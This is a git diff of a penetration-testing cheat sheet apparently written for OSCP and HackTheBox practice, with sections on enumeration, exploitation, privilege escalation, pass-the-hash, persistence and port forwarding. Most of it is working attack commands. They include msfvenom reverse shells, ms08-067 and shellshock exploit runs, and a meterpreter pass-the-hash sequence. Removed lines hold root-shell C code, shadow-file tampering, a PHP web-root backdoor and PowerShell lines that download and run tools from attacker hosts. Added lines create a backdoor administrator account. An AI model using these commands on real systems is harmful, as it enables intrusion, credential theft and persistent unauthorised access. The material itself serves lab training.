+  hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f <targetip> ftp
 
 ```
   
@@ -565,14 +567,8 @@ check if ftp root directory is also http root directory and upload php reverse s
 ---
 <a name="enumerate_proto_http"></a>
 #### enumerate_proto_http [⇡](#enumerate)  
+identify web server, technology, application. identify versions. run nikto, dirb/dirbuster, gobuster scans. look at robots.txt. look at source code. check for default creds, lfi/rfi, sqli, wordpress  
 ```shell
-identify web server, technology, application
-identify versions
-run nikto, dirb/dirbuster, gobuster scans
-look at robots.txt
-look at source code
-check for default creds, lfi/rfi, sqli, wordpress
-
 bash /usr/share/sparta/scripts/x11screenshot.sh <targetip>
 cewl http://<targetip>:<targetport>/ -m 6, "http,https,ssl,soap,http-proxy,http-alt" ## create wordlist by crawling webpage
 cewl https://<targetip>:<targetport>/ -m 6, "http,https,ssl,soap,http-proxy,http-alt" ## create wordlist by crawling webpage
@@ -1455,6 +1451,7 @@ http://<targetip>/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.
 #### exploit_shellshock [⇡](#exploit)  
 ```shell
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<targetip>/cgi-bin/user.sh
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <targetip>
 
 ```
   
@@ -1462,6 +1459,7 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http
 |---|------|------|------------|------|----------|
 | 1. | 13/Nov/2019 | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf) |  | [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100" /> |
   
+[+] https://zayotic.com/posts/oscp-reference/  
 [+] https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/  
 [+] https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/  
   
@@ -1470,13 +1468,17 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http
 #### exploit_smb_ms08_067 [⇡](#exploit)  
 (netapi exploit) for microsoft windows xp systems with open smb ports, use the [ms08-067](https://github.com/andyacer/ms08_067) metasploit module [`windows/smb/ms08_067_netapi`]()  
 ```shell
-nmap -p 445 -script smb-check-vulns -script-args=unsafe=1 <targetip>
-msfcli auxiliary/scanner/smb/ms08_067_check rhosts=<targetip> threads=100 E
-manual:
+scan:
+  nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 <targetip>
+  msfcli auxiliary/scanner/smb/ms08_067_check rhosts=<targetip> threads=100 E
+manual_a:
   wget https://raw.githubusercontent.com/andyacer/ms08_067/master/ms08_067_2018.py
   msfvenom -p windows/shell_reverse_tcp LHOST=<attackerip> LPORT=<attackerport> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
   nc -nlvp <attackerport>
   python ms08_067_2018.py <targetip> <osid> <targetport>
+manual_b:
+  searchsploit ms08-067
+  python /usr/share/exploitdb/platforms/windows/remote/7132.py <targetip> 1
 msf:
   use exploit/windows/smb/ms08_067_netapi
   set RHOST <targetip>
@@ -1950,7 +1952,7 @@ gcc -m32 -o exploit 9542.c -Wl,--hash-style=both
 #### privesc_lxc_bash [⇡](#privesc)  
 ```shell
 check output of id command
-if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+if user is member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
 
 ```
   
@@ -2132,8 +2134,8 @@ being able to edit the `/etc/sudoers` file to give a user elevated privileges
 #### privesc_windows_ms10_059 [⇡](#privesc)  
 ```shell
 wget https://github.com/abatchy17/WindowsExploits/raw/master/MS10-059%20-%20Chimichurri/MS10-059.exe
-sharehttp 8080
-certutil.exe -urlcache -split -f "http://<attackerip>:8080/MS10-059.exe" pe.exe
+sharehttp <targetport>
+certutil.exe -urlcache -split -f "http://<attackerip>:<targetport>/MS10-059.exe" pe.exe
 nc -nlvp 444
 pe.exe <attackerip> 444
 
@@ -2208,24 +2210,6 @@ net start upnphost
 
 <a name="tips"></a>
 ## ⚡ Tips [↟](#contents)
-### oscp practise [🡑](#tips)  
-```
-https://github.com/ajdumanhug/oscp-practice
-```  
-### tmux shortcuts [🡑](#tips)  
-```
-prefix: ctrl + b
-toggle logging: prefix + shift + p
-screen cap: prefix + alt + p
-complete history: prefix + alt + shift + p
-```  
-### shell shortcuts [🡑](#tips)  
-```
-machinescli: update local stats for htb|vh|oscplike|owned machines, query stats, search for ippsec writeups or vh description, track owned|oscplike machines
-svachal: writeups manager, can start|finish|rebuild|summarize writeups, auto updates readme and metanotes md files, auto creates ttps csv for openports|ttps shortcuts
-openports: shows open ports from autorecon|manual scan results
-ttps: shows ttps for open ports, can find both suggested and itw ttps
-```  
 ### bind shell [🡑](#tips)  
 ```
 bs.c
@@ -2378,32 +2362,46 @@ config file: /etc/iptables/rules.v4
 ```  
 ### lfi/rfi/image upload [🡑](#tips)  
 ```
-https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
-uniscan -u http://<targetip>/ -qweds
-wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://<targetip>/FUZZ
-https://snowscan.io/htb-writeup-friendzone/
-php://filter/convert.base64-encode/resource=<pagename>
-http://zerofreak.blogspot.com/2012/04/lfi-exploitation-via-phpinput-shelling.html
-php command execution: <? passthru($_GET[cmd]) ?>
+scan:
+  uniscan -u http://<targetip>/ -qweds
+  wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://<targetip>/FUZZ
+php b64 leak and command execution:
+  php://filter/convert.base64-encode/resource=<pagename>
+  <?php echo passthru($_GET[cmd]) ?>
 bypass upload filter:
   change extension to PHP, PHP3, PHP4, PHP5
   add magic bytes to start of file (eg: GIF87 to a php shell) to evade upload filters
-https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
 local file access: http://<targetip>/?page=php://filter/convert.base64-encode/resource=index
-notice urls that accept a generic filename as parameter: ?page=file1.php
-?page=../../../../../../etc/passwd
-?page=../../../../../../windows/system32/drivers/etc/hosts
-ippsec steps (htb.beep: https://youtu.be/XJmBpOd__N8) :
-/etc/passwd
-/proc/self/status
-find home username in passwd, locate home directory for user
-/var/lib/asterisk/.ssh/id_rsa
+notice urls that accept a generic filename as parameter:
+  ?page=file1.php
+  ?page=../../../../../../etc/passwd
+  ?page=../../../../../../windows/system32/drivers/etc/hosts
+ippsec steps (htb.beep: https://youtu.be/XJmBpOd__N8):
+  /etc/passwd
+  /proc/self/status
+find home username in passwd, locate home directory for user:
+  /var/lib/asterisk/.ssh/id_rsa
 ```  
 ### passthehash [🡑](#tips)  
 ```
-fgdump.exe
-/usr/bin/pth-winexe -U administrator%0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 //<targetip> cmd.exe
-wmiexec.exe -hashes 0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 administrator@localhost
+pth-toolkit:
+  git clone https://github.com/byt3bl33d3r/pth-toolkit
+  pth-winexe -U hash //IP cmd
+xfreerdp:
+  apt-get install freerdp-x11
+  xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+meterpreter:
+  meterpreter > run post/windows/gather/hashdump
+  Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+  msf > use exploit/windows/smb/psexec
+  msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+  msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+  msf exploit(psexec) > exploit
+  meterpreter > shell
+misc:
+  fgdump.exe
+  /usr/bin/pth-winexe -U administrator%0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 //<targetip> cmd.exe
+  wmiexec.exe -hashes 0182BD0BD4444BF836077A718CCDF409:259745CB123A52AA2E693AAACCA2DB52 administrator@localhost
 ```  
 ### passwords [🡑](#tips)  
 ```
@@ -2415,13 +2413,15 @@ mkpasswd -m sha-512 password salt
 ```  
 ### persistence [🡑](#tips)  
 ```
-windows:
 add a new administrator user:
   net user anderson cooper /add && net localgroup administrators anderson /add
 add user to rdp group:
   net localgroup "Remote Desktop Users" anderson /add
 enable rdp in firewall:
-  netsh firewall add portopening TCP 3389 "RDP"
+  reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+  netsh firewall set service remoteadmin enable
+  netsh firewall set service remotedesktop enable
+  netsh firewall add portopening TCP <targetport> "RDP"
 enable rdp via registry (requries reboot):
   reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 is rdp service running:
@@ -2430,487 +2430,65 @@ start rdp service:
   net start TermService
 permanently enable rdp service:
   sc config TermService start=auto
-useradd.c
-  #include <stdlib.h>
-  int main() {
-    int i;
-    i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
-    return 0;
-  }
-windows - add user:
-  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
-  int main() {
-    int i;
-    i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
-    return 0;
-  }
-  # compile: i686-w64-mingw32-gcc -o useradd.exe useradd.c
+code:
+  useradd.c:
+    #include <stdlib.h>
+    int main() {
+      int i;
+      i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
+      return 0;
+    }
+  add user:
+    #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+    int main() {
+      int i;
+      i=system("net user anderson cooper /add && net localgroup administrators anderson /add");
+      return 0;
+    }
+    # compile: i686-w64-mingw32-gcc -o useradd.exe useradd.c
 ```  
 ### port forward [🡑](#tips)  
 ```
-socat tcp-listen:8080,fork,reuseaddr tcp:127.0.0.1:80 &
-socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
-
-plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport> <localuser>@<attackerip>
+socat:
+  socat tcp-listen:<targetport>,fork,reuseaddr tcp:127.0.0.1:80 &
+  socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
+plink:
+  plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport> <localuser>@<attackerip>
+meterpreter:
+  # https://www.offensive-security.com/metasploit-unleashed/portfwd/
+  # forward remote port to local address
+  meterpreter > portfwd add --l <targetport> --p <targetport> --r <targetip>
+  kali > rdesktop 127.0.0.1:<targetport>
 ```  
 ### portknock [🡑](#tips)  
 ```
-knock once on port 8080/tcp:
-hping3 <targetip> -S -p 8080 -c 1
-nc -vvvz <targetip> 8080
+knock once on port <targetport>/tcp:
+hping3 <targetip> -S -p <targetport> -c 1
+nc -vvvz <targetip> <targetport>
 knock on multiple tcp ports in a given sequence:
 hping3 <targetip> -S -p 666 -c 1; hping3 <targetip> -S -p 7000 -c 1; hping3 <targetip> -S -p 8890 -c 1
 nmap -Pn -sT -r -p666,7000,8890 <targetip>
 ```  
-### privesc [🡑](#tips)  
-```
-lpeworkshop (https://github.com/sagishahar/lpeworkshop) and lpe course (https://www.udemy.com/course/linux-privilege-escalation/):
-linux:
-  id ; whoami ; uname -a ; w ; lsb_release -a
-  enumerate:
-    tools:
-    lse.sh:
-      ./lse.sh -l2 # show all gathered info
-      ./lse.sh -l2 -c # disable colors
-    linenum.sh
-    linux-exploit-suggester-2.pl # kernel exploitation
-    misc techniques (https://twitter.com/JaneScott_/status/1144134954353217536):
-    find /var/www -xdev -perm -o+w -ls ; echo "<?php passthru($_GET['cmd']); ?>" > /var/www/<output from first command>/backdoor.php
-    ./unix-privesc-check detailed && find / -xdev -perm -u+s -type f -ls && find / -xdev -perm -o+w -ls
-    wget https://raw.githubusercontent.com/zMarch/Orc/master/o.rc && ENV=o.rc sh -i "gethelp"
-    w;uname -a;lsb_release -a
-    find -O3 / -perm -u=s -type f -ls 2>/dev/null
-    cat /home/*/.ssh/id_rsa
-    history ; find / -perm -4000 -exec ls -l {} \;
-    find / -type f -mmin -60 -ls 2>/dev/null # find recently modified files; can use pspy alternatively
-  spawn root shell:
-    suid bash:
-    create a copy of /bin/bash, make sure it is owned by root user and has suid bit set. this is a persistent method and can be used to gain root privileges on demand using the -p flag at invocation
-    custom executable:
-    if we control a process that gets executed by a root process (eg: cron jobs), use the following code to create a custom binary for the initial process under our control:
-      int main(){setuid(0);system("/bin/bash -p");}
-      gcc -o rootbash rootbash.c
-    msfvenom can also be used in case a reverse shell is desired (use netcat or multi/handler to catch incoming connection):
-      msfvenom-p linux/x86/shell_reverse_tcpLHOST=<attackerip> LPORT=<attackerport> -f elf >rootbash
-  kernel:
-    manual:
-    $ uname -a
-      Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
-    # searchsploit linux kernel 2.6.32 priv esc debian
-    # linux-exploit-suggester-2.pl -k 2.6.32
-    dirtycow:
-    affected kernel versions: 2.6.22 < 4.8.3
-    https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
-    https://www.exploit-db.com/exploits/40839
-      gcc -pthread -lcrypt -o 40839 40839.c
-      ./40839 # enter password when prompted, press ctrl+c if needed
-      su <username>
-    https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
-      gcc -pthread c0w.c -o c0w
-      ./c0w
-      /usr/bin/passwd
-    vmsplice:
-    https://www.exploit-db.com/exploits/5092
-  service:
-    manual:
-      find services running as root:
-        $ ps aux | grep "^root"
-      find program version:
-        $ <program> --version
-        $ <program> -v
-        $ dpkg -l | grep <program>
-        $ rpm -qa | grep <program>
-    apache2:
-      sudo -l => shows apache2 can be run as sudo
-      sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
-      john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
-    exim:
-      dpkg -l | grep -i exim => version <4.86.2
-      exim -bV -v | grep -i perl => compiled with perl support
-      head /etc/exim.conf => configuration has perl_startup option
-      ./cve_2016-1521.sh
-    lxd:
-      check output of id command
-      if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
-    mysqld:
-      when mysql is running as root
-      mysql has ability to install uder defined functions which run via shared objects
-      use [edb:1518](https://www.exploit-db.com/exploits/1518)
-      once exploit is complete, do the following:
-        mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
-        mysql> exit
-        $ /tmp/rootbash -p
-        rootbash-4.1# id
-          uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-    strace:
-      https://gtfobins.github.io/gtfobins/strace/
-      write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
-    udev:
-    netlink:
-        https://www.exploit-db.com/exploits/8478
-        affected udev versions: <1.4.1
-        cat /proc/net/netlink
-        select pid for group "ffffffff"
-    port forwarding:
-      if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
-      $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
-  weak file permissions:
-    important commands:
-    $ find /etc -maxdepth 1 -writable -type f
-    $ find /etc -maxdepth 1 -readable -type f
-    $ find / -executable -writable -type d 2> /dev/null
-    /etc/shadow file:
-    if we have read permissions, use it to extract password and crack it:
-      # echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
-      # john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-      $ su
-    if we have write permissions, use it to edit entry for root password hash we know:
-      $ cp /etc/shadow /tmp/shadow.bck
-      # mkpasswd-m sha-512 <newpassword>
-      $ echo -en "root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:<attackerport>9:7:::" >>/etc/shadow
-      $ su
-    /etc/passwd file:
-    hash within passwd file takes precedence over hash in shadow file
-    if we can only append, create a uid 0 entry for a new user (linux allows multiple users with different names to have uid 0)
-      $ cp /etc/passwd /tmp/passwd.bck
-      $ openssl passwd "newpassword"
-      $ echo -en "newroot:SkZvJDdq90GJw:0:0:root:/root:/bin/bash" >>/etc/passwd
-      $ su newroot
-    backups:
-    backups of sensitive files can prove useful when those files themselves are not accessible
-    look for readable files within below directories:
-      ls -la / /home/* /tmp/ /var/backups
-    if we have read permission for .ssh directory, check if we can ssh as root and then if we can, copy .ssh/id_rsa to your system:
-      $ grep PermitRootLogin /etc/ssh/sshd_config
-      # chmod 600 id_rsa
-      # ssh -i id_rsa root@<targetip>
-  sudo:
-    list allowed programs:
-    sudo -l
-    if user is member of sudo group and user password is available:
-    sudo su
-    other methods:
-    sudo -s
-    sudo -i
-    sudo /bin/bash
-    sudo passwd
-    shell escape sequences:
-    https://gtfobins.github.io/
-    sudo -l:
-      awk: sudo awk 'BEGIN {system("/bin")}'
-      find: sudo find /bin -name nano -exec /bin/sh \;
-      vim: sudo vim -c '!sh'
-      nmap:
-        non-interactive: echo "os.execute('/bin/sh')" >shell.nse && sudo nmap --script=shell.nse
-        interactive:
-        nmap --interactive
-          > !sh
-    abuse intended functionality:
-    if escape sequneces don't work, we can still leverage sudo privs to read/write root owned files
-    apache2:
-      $ sudo -l
-        ...(root) NOPASSWD: /usr/sbin/apache2
-      $ sudo apache2 -f /etc/shadow
-        Syntax error on line 1 of /etc/shadow:
-        Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:<attackerport>9:7:::', perhaps misspelled or defined by a module not included in the server configuration
-      $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' >hash.txt'
-      $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-      $ su
-    env_keep:
-    programs run through sudo can inherit environment variables, if env_keep option is set. they won't if env_reset is set. can be checked via "sudo -l"
-    LD_PRELOAD:
-      an environment variable which can be set to the path of a shared object (.so) file
-      when set, the shared object will be loaded before any others
-      creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded
-      LD_PRELOAD doesn't work if ruid != euid
-      sudo must be configured to preserve LD_PRELOAD via env_keep
-        $ sudo-l
-        Matching Defaults entries for user on this host:
-        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-      create a preload.c file:
-        #include <stdio.h>
-        #include <sys/types.h>
-        #include <stdlib.h>
-        void _init(){unsetenv("LD_PRELOAD");setresuid(0,0,0);system("/bin/bash -p");}
-        $ gcc -fPIC -shared -nostartfiles-o /tmp/preload.so preload.c
-        $ sudo LD_PRELOAD=/tmp/preload.so apache2
-        # id
-        uid=0(root) gid=0(root) groups=0(root)
-    LD_LIBRARY_PATH:
-      an environment variable that contains a set of directories where shared libraries are searched for first
-      the ldd command can be used to print the shared libraries used by a program:
-        $ ldd /usr/sbin/apache2
-      by creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead
-      sudo must be configured to preserve LD_LIBRARY_PATH via env_keep
-        $ sudo-l
-        Matching Defaults entries for user on this host:
-        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-      create a library_path.c file:
-        #include <stdio.h>
-        #include <stdlib.h>
-        static void hijack() __attribute__((constructor));void hijack(){unsetenv("LD_LIBRARY_PATH");setresuid(0,0,0);system("/bin/bash -p");}
-        $ gcc-o libcrypt.so.1 -shared -fPIC library_path.c
-        $ sudo LD_LIBRARY_PATH=. apache2
-        # id
-        uid=0(root) gid=0(root) groups=0(root)
-  cron:
-    user cronjobs are stored in /var/spool/cron/ or /var/spool/cron/crontabs/ , system cronjobs are stored in /etc/crontab
-    file overwrite:
-    $ cat /etc/crontab => overwrite.sh is run as root and is world writable
-    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/usr/local/bin/overwrite.sh
-    $ /tmp/bash -p => can use /bin/sh as well
-    # id
-    path:
-    useful when a cronjob doesn't use absolute path for a program and one of the path directories is writable
-    $ cat /etc/crontab => $PATH has /home/user as the first search location and overwrite.sh is called without it's absolute path
-    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/home/user/overwrite.sh
-    $ /tmp/bash -p => can use /bin/sh as well
-    # id
-    wildcards:
-    $ cat /etc/crontab => compress.sh is run as root and is world readable
-    $ cat /usr/local/bin/compress.sh => tar command uses a shell wildcard within /home/user directory
-    $
-    $ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >/home/user/runme.sh
-    $ touch /home/user/--checkpoint=1
-    $ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
-    $ /home/user/bash -p
-    # id
-    OR
-    $ msfvenom-p linux/x64/shell_reverse_tcpLHOST=<IP> LPORT=53 -f elf -o shell.elf
-    $ touch /home/user/--checkpoint=1
-    $ touch /home/user/--checkpoint-action=exec=shell.elf
-    # nc -nlvp 53
-  suid/sgid binaries:
-    find suid/sgid binaries:
-    $ find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2> /dev/null
-    shell escape sequences:
-    https://gtfobins.github.io/
-    sudo -l:
-      awk: sudo awk 'BEGIN {system("/bin")}'
-      find: sudo find /bin -name nano -exec /bin/sh \;
-      vim: sudo vim -c '!sh'
-      nmap:
-        non-interactive: echo "os.execute('/bin/sh')" >shell.nse && sudo nmap --script=shell.nse
-        interactive:
-        nmap --interactive
-          > !sh
-    LD_PRELOAD/LD_LIBRARY_PATH:
-    both these environment variables are ignored for suid/sgid files by default in linux for security reasons
-    known exploits:
-    certain programs create suid files that can be exploited
-    exim:
-      $ find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2> /dev/null
-        ...
-        -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-        ...
-      $ /usr/sbin/exim-4.84-3 --version
-        Exim version 4.84 #3 built 13-May-2017 01:45:35
-      # searchsploit exim 4.84
-        ...
-        Exim 4.84-3 - Local Privilege Escalation | exploits/linux/local/39535.sh
-      $ ./privesc.sh
-        [ CVE-2016-1531 local root exploit
-      # id
-        uid=0(root) gid=1000(user) groups=0(root)
-    shared object injection:
-    $ find / -type f -perm -04000 -ls 2>/dev/null => note all suid binaries
-    $ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file" => one of the suid binaries is missing a shared object in a writable location
-      #include <stdio.h>
-      #include <stdlib.h>
-      static void inject() __attribute((constructor));
-      void inject(){system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");}
-    $ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c => create a custom shared object for missing file
-    $ /usr/local/bin/suid-so => run suid binary to get root shell
-    # id
-    path environment variable:
-    look for vulnerable programs:
-      $ strings /path/to/file
-      $ strace -v -f -e execve <command> 2>&1 | grep exec
-      $ ltrace <command>
-    search for suid binaries:
-      $ find / -type f -perm -04000 -ls 2>/dev/null
-    look for strings within a suid binary, this one calls "service apache2 start", service doesn't have absolute path:
-      $ strings /usr/local/bin/suid-env
-    create a dummy service binary to gain root shell:
-      $ echo 'int main(){setgid(0);setuid(0);system("/bin/bash -p");return 0;}'>/tmp/service.c
-    compile dummy service binary and place in /tmp directory:
-      $ gcc /tmp/service.c -o /tmp/service
-    update path to load service from /tmp first:
-      $ export PATH=/tmp:$PATH
-    run suid binary to gain root shell:
-      $ /usr/local/bin/suid-env
-      # id
-    abusing shell features #1:
-    some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name
-    these functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called
-    search for suid binaries:
-      $ find / -type f -perm -04000 -ls 2>/dev/null
-    look for strings within a suid binary, this one calls "/usr/sbin/service apache2 start":
-      $ strings /usr/local/bin/suid-env2
-    create a shell function with name equal to absolute path of service binary:
-      $ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
-    export function:
-      $ export -f /usr/sbin/service
-    run suid binary to gain root shell:
-      $ /usr/local/bin/suid-env2
-      # id
-    abusing shell features #2:
-    the Bash shell has a debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment variable to include xtrace
-    by default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set
-    when in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements
-    this variable can include an embedded command, which will execute every time it is shown
-    if an SUID file runs another program via Bash (e.g. by using system()) these environment variables can be inherited
-    if an SUID file is being executed, this command will execute with the privileges of the file owner
-    in Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root
-    $ env -i SHELLOPTS=xtrace PS4='$(/cp /bin/bash /tmp && chown root:root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
-    # id
-    symlink:
-    https://www.exploit-db.com/exploits/40768
-    $ dpkg -l | grep nginx => nginx version is <1.6.2-5+deb8u3
-    $ su -l www-data => need to www-data for exploit to work
-    $ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log => exploit script
-      wait for logs to rotate, to speed up the process:
-        ssh user@192.168.92.162
-        su
-        invoke-rc.d nginx rotate >/dev/null 2>&1
-    # id
-  password and keys:
-    password reuse can be an easy way to priv esc (service files leaking password that is reused for system root account)
-    history files:
-    $ cat $HOME/.*history | less
-      ls -al
-      cat .bash_history
-      ls -al
-      mysql-h somehost.local -uroot -ppassword123
-    $ su
-    # id
-    config files:
-    $ ls
-      myvpn.ovpn tools
-    $ cat myvpn.ovpn
-      ...
-      auth-user-pass /etc/openvpn/auth.txt
-      ...
-    $ cat /etc/openvpn/auth.txt
-      root
-      password123
-    $ su
-    # id
-    ssh keys:
-    copy .ssh/id_rsa to local system
-    $ grep PermitRootLogin /etc/ssh/sshd_config
-    # chmod 600 id_rsa
-    # ssh -i id_rsa root@<targetip>
-  nfs:
-    check available mountpoints:
-    # nmap -sV -script=nfs-showmount <targetip>
-    OR
-    $ cat /etc/exports => / *(rw,no_root_squash)
-    $ cat /etc/exports => /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
-    steps:
-    # showmount -e 192.168.92.162
-    # mkdir /tmp/lpe
-    # mount -o rw,vers=2 192.168.92.162:/tmp /tmp/lpe/
-    # echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/lpe/shell.c
-    # gcc -o /tmp/lpe/shell /tmp/lpe/shell.c 
-    # chmod +s /tmp/lpe/shell
-    # ls -l /tmp/lpe/
-    $ /tmp/shell
-    # id
-    root squashing:
-    allows nfs to squash root user privs to avoid privesc
-    can be disabled using the no_root_squash option within config
-  misc:
-    chkrootkit:
-    create a file /tmp/update with commands for lpe
-    make /tmp/update executable
-    wait for chkrootkit to execute as part of cronjob
-    ssh knownhosts:
-    sometimes there could be a 127.0.0.1 entry within a non-root user's known_hosts file
-    if the ssh config allows root login and non-root user's public key is added to root's authorized_keys
-    we can ssh as root: ssh -i id_rsa root@127.0.0.1
-windows:
-  systeminfo
-  whoami /priv:
-    if SeImpersonatePrivilege are enabled, use juicypotato (https://github.com/ohpe/juicy-potato/releases). this will also need a reverse shell that can be created using msfvenom
-  enumerate:
-    wpc.exe
-    https://github.com/GDSSecurity/Windows-Exploit-Suggester
-    windows_privesc_check.py
-    windows-privesc-check2.exe
-    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-    check file permissions (useful if writable by everyone): icacls filename
-    running services: wmic service where started=true get name, startname
-    stored credentials:
-    dir C:\unattend.xml
-    post/windows/gather/enum_unattend
-    post/windows/gather/credentials/gpp
-    reg query "HKCU\Software\ORL\WinVNC3\Password"
-    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-  enumerate:
-    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/mimikatz64.exe','c:\temp\mimikatz64.exe')"
-    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/nc64.exe','c:\temp\nc64.exe')"
-    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/priv-check.exe','c:\temp\priv-check.exe')"
-    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/jaws-enum.ps1','c:\temp\jaws-enum.ps1')"
-    powershell -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.29.31:8000/powerup.ps1'); Invoke-AllChecks"
-    powershell -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1'); Find-AllVulns"
-  services:
-    dll hijacking
-    unquoted paths
-    named pipes
-    registry
-    executable file
-    binPath
-    SERVICE_ALL_ACCESS:
-    accesschk.exe -cuwv "user" *
